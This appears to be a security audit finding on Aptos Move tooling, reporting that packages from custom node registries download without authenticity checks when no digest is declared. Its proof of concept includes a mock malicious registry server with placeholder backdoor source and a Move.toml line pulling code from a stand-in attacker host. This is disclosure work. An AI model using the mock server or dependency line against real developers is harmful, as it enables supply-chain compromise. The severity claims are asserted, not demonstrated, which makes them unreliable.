# Audit Report

## Title
Supply Chain Attack via Unauthenticated Package Download from Custom Node Registries

## Summary
The `maybe_download_package()` function downloads Move packages from custom node registries without cryptographic verification of package authenticity when no digest is specified in the dependency declaration. A malicious node can return a package with the correct name but containing backdoored source code, which will be accepted and compiled without validation.

## Finding Description

The vulnerability exists in the custom dependency resolution system for Move packages. When a developer declares a dependency using the custom "aptos" key in Move.toml, the system downloads the package from a user-specified node URL.

The attack flow is as follows:

1. **Dependency Declaration**: A developer declares a dependency with a custom node URL: [1](#0-0) 

The `digest` field is optional in this declaration: [2](#0-1) 

2. **Package Download**: During dependency resolution, the system calls the custom dependency resolver: [3](#0-2) 

This leads to `maybe_download_package()`: [4](#0-3) 

3. **Registry Fetching**: The function creates a `CachedPackageRegistry` by fetching data from the specified node URL: [5](#0-4) 

4. **Package Retrieval**: The package is retrieved by name only: [6](#0-5) 

**Critical Issue**: The `get_package()` method only validates that the package name matches. It does NOT verify:
- The package content matches what should be at that blockchain address
- The source code is authentic
- The node is returning truthful data

5. **Digest Validation (Optional)**: Digest validation only occurs IF the developer specified a digest: [7](#0-6) 

**The vulnerability**: If no digest is specified (which is optional), NO cryptographic verification occurs.

A malicious attacker can:
- Set up a REST API endpoint mimicking an Aptos node
- Return a fake `PackageRegistry` with a package that has the correct name but malicious source code
- The package will be downloaded and saved without any authenticity verification
- The malicious code will be compiled and potentially deployed to the blockchain

This breaks the **Package Authenticity** security guarantee and enables supply chain attacks.

## Impact Explanation

This vulnerability has **Critical** severity for the following reasons:

1. **Supply Chain Attack**: Attackers can inject malicious code into Move packages that developers depend on, affecting all downstream users of those packages.

2. **Loss of Funds**: If the malicious code is in a smart contract handling user funds, it could steal or lock those funds. This meets the "Loss of Funds (theft or minting)" criterion for Critical severity.

3. **Consensus Impact**: If malicious packages are used in validator node infrastructure or consensus-related code, they could cause consensus violations or safety breaks, meeting the "Consensus/Safety violations" criterion.

4. **Widespread Impact**: A single malicious package could affect multiple projects and users across the ecosystem.

5. **Difficulty of Detection**: Without explicit digest validation, developers may not realize they've downloaded compromised code until it's deployed and causing harm.

The attack enables code injection into the trusted computing base of Move applications, making this a fundamental security failure with catastrophic potential impact.

## Likelihood Explanation

The likelihood of exploitation is **HIGH** due to:

1. **Low Technical Barrier**: Setting up a malicious REST API endpoint is trivial. The attacker just needs basic web server capabilities.

2. **Social Engineering Vectors**: 
   - Documentation/tutorials might reference third-party nodes
   - Developers might copy dependency declarations from untrusted sources
   - Typosquatting of popular node URLs
   - Compromised third-party infrastructure

3. **Optional Security**: The digest field is optional, not mandatory. Many developers may not know to include it or may skip it for convenience.

4. **No Warning System**: The system doesn't warn users when downloading packages without digest verification.

5. **Trust in Node Operators**: Developers may trust that nodes are returning authentic blockchain data without realizing the client-side validation is insufficient.

6. **Real-World Precedent**: Supply chain attacks are increasingly common in software development (npm, PyPI compromises, etc.).

The combination of low attack complexity and high potential for social engineering makes this vulnerability highly likely to be exploited.

## Recommendation

Implement mandatory package authenticity verification through one or more of the following approaches:

1. **Make Digest Mandatory**: Require the `digest` field for all custom dependencies:
```rust
// In manifest_parser.rs, after parsing custom dependency
if digest.is_none() {
    bail!("Digest is required for custom node dependencies. Please specify 'digest' field.");
}
```

2. **On-Chain Verification**: Query the package data from multiple trusted nodes or from the blockchain directly to verify the node is returning authentic data. Compare the returned data against the actual blockchain state.

3. **Package Signatures**: Implement cryptographic signatures for packages, where the package owner signs the package content with their private key, and the signature is verified during download.

4. **Trusted Node Whitelist**: Maintain a whitelist of trusted node URLs and warn users when using non-whitelisted nodes.

5. **Add Validation Function**:
```rust
// In maybe_download_package(), add verification
async fn maybe_download_package(info: &CustomDepInfo) -> anyhow::Result<()> {
    if !info.download_to.join(CompiledPackageLayout::BuildInfo.path()).exists() {
        let registry = CachedPackageRegistry::create(
            Url::parse(info.node_url.as_str())?,
            load_account_arg(info.package_address.as_str())?,
            false,
        ).await?;
        let package = registry.get_package(info.package_name).await?;
        
        // NEW: Verify package authenticity
        verify_package_authenticity(&package, info)?;
        
        package.save_package_to_disk(info.download_to.as_path())
    } else {
        Ok(())
    }
}

fn verify_package_authenticity(package: &CachedPackageMetadata, info: &CustomDepInfo) -> anyhow::Result<()> {
    // Implement multi-node verification or require digest
    bail!("Package authenticity verification not implemented");
}
```

**Immediate mitigation**: At minimum, make digest mandatory for custom node dependencies and add clear warnings in documentation about the security implications of custom dependencies.

## Proof of Concept

```rust
// PoC: Malicious Node Server Mock
use actix_web::{web, App, HttpResponse, HttpServer};
use serde::{Deserialize, Serialize};

#[derive(Serialize, Deserialize)]
struct PackageRegistry {
    packages: Vec<PackageMetadata>,
}

#[derive(Serialize, Deserialize)]
struct PackageMetadata {
    name: String,
    upgrade_policy: u8,
    upgrade_number: u64,
    source_digest: String,
    manifest: Vec<u8>,
    modules: Vec<ModuleMetadata>,
    deps: Vec<PackageDep>,
    extension: Option<String>,
}

#[derive(Serialize, Deserialize)]
struct ModuleMetadata {
    name: String,
    source: Vec<u8>, // Malicious source code here
    source_map: Vec<u8>,
    extension: Option<String>,
}

#[derive(Serialize, Deserialize)]
struct PackageDep {
    account: String,
    package_name: String,
}

async fn malicious_package_registry() -> HttpResponse {
    let malicious_code = b"module malicious::backdoor { public fun steal_funds() { /* malicious logic */ } }";
    
    let registry = PackageRegistry {
        packages: vec![PackageMetadata {
            name: "LegitimatePackage".to_string(), // Correct name to pass validation
            upgrade_policy: 0,
            upgrade_number: 1,
            source_digest: "fake_digest".to_string(), // Fake digest
            manifest: vec![],
            modules: vec![ModuleMetadata {
                name: "backdoor".to_string(),
                source: malicious_code.to_vec(), // MALICIOUS CODE
                source_map: vec![],
                extension: None,
            }],
            deps: vec![],
            extension: None,
        }],
    };
    
    HttpResponse::Ok().json(registry)
}

// Move.toml - Vulnerable Dependency Declaration:
// [dependencies]
// LegitimatePackage = { aptos = "http://malicious-node.com:8080", address = "0x1", package_name = "LegitimatePackage" }
// # Note: No digest field specified!

// Result: The malicious package downloads successfully, compiles, and deploys with backdoor code.
```

**Steps to reproduce**:
1. Set up the malicious REST API server above
2. Create a Move.toml with a dependency pointing to the malicious server (without digest field)
3. Run `aptos move compile` or similar build command
4. Observe that the package downloads without any authentication error
5. Inspect the downloaded source code - it contains the malicious code
6. The package compiles successfully with backdoored modules

This demonstrates that the system trusts the node completely and accepts any package with the matching name, enabling trivial supply chain attacks.

### Citations

**File:** third_party/move/tools/move-package/src/source_package/manifest_parser.rs (L330-330)
```rust
            let digest = table.remove("digest").map(parse_digest).transpose()?;
```

**File:** third_party/move/tools/move-package/src/source_package/manifest_parser.rs (L392-424)
```rust
                (None, None, Some(custom_key)) => {
                    let package_name = Symbol::from(dep_name);
                    let address = match table.remove("address") {
                        None => bail!("Address not supplied for 'node' dependency"),
                        Some(r) => Symbol::from(
                            r.as_str()
                                .ok_or_else(|| format_err!("Node address not a string"))?,
                        ),
                    };
                    // Downloaded packages are of the form <sanitized_node_url>_<address>_<package>
                    let node_url = custom_key
                        .as_str()
                        .ok_or_else(|| anyhow::anyhow!("Git URL not a string"))?;
                    let local_path = PathBuf::from(MOVE_HOME.clone()).join(format!(
                        "{}_{}_{}",
                        url_to_file_name(node_url),
                        address,
                        package_name
                    ));
                    node_info = Some(PM::CustomDepInfo {
                        node_url: Symbol::from(node_url),
                        package_address: address,
                        package_name,
                        download_to: local_path.clone(),
                    });
                    Ok(PM::Dependency {
                        subst,
                        version,
                        digest,
                        local: local_path,
                        git_info,
                        node_info,
                    })
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L456-472)
```rust
        match dep.digest {
            None => (),
            Some(fixed_digest) => {
                let resolved_pkg = self
                    .package_table
                    .get(&dep_name_in_pkg)
                    .context("Unable to find resolved package by name")?;
                if fixed_digest != resolved_pkg.source_digest {
                    bail!(
                        "Source digest mismatch in dependency '{}'. Expected '{}' but got '{}'.",
                        dep_name_in_pkg,
                        fixed_digest,
                        resolved_pkg.source_digest
                    )
                }
            },
        }
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L612-614)
```rust
        if let Some(node_info) = &dep.node_info {
            package_hooks::resolve_custom_dependency(dep_name, node_info)?
        }
```

**File:** crates/aptos/src/move_tool/package_hooks.rs (L38-54)
```rust
async fn maybe_download_package(info: &CustomDepInfo) -> anyhow::Result<()> {
    if !info
        .download_to
        .join(CompiledPackageLayout::BuildInfo.path())
        .exists()
    {
        let registry = CachedPackageRegistry::create(
            Url::parse(info.node_url.as_str())?,
            load_account_arg(info.package_address.as_str())?,
            false,
        )
        .await?;
        let package = registry.get_package(info.package_name).await?;
        package.save_package_to_disk(info.download_to.as_path())
    } else {
        Ok(())
    }
```

**File:** crates/aptos/src/move_tool/stored_package.rs (L43-69)
```rust
    pub async fn create(
        url: Url,
        addr: AccountAddress,
        with_bytecode: bool,
    ) -> anyhow::Result<Self> {
        let client = Client::new(url);
        // Need to use a different type to deserialize JSON
        let inner = client
            .get_account_resource_bcs::<PackageRegistry>(addr, "0x1::code::PackageRegistry")
            .await?
            .into_inner();
        let mut bytecode = BTreeMap::new();
        if with_bytecode {
            for pack in &inner.packages {
                for module in &pack.modules {
                    let bytes = client
                        .get_account_module(addr, &module.name)
                        .await?
                        .into_inner()
                        .bytecode
                        .0;
                    bytecode.insert(module.name.clone(), bytes);
                }
            }
        }
        Ok(Self { inner, bytecode })
    }
```

**File:** crates/aptos/src/move_tool/stored_package.rs (L97-108)
```rust
    pub async fn get_package(
        &self,
        name: impl AsRef<str>,
    ) -> anyhow::Result<CachedPackageMetadata<'_>> {
        let name = name.as_ref();
        for package in &self.inner.packages {
            if package.name == name {
                return Ok(CachedPackageMetadata { metadata: package });
            }
        }
        bail!("package `{}` not found", name)
    }
```
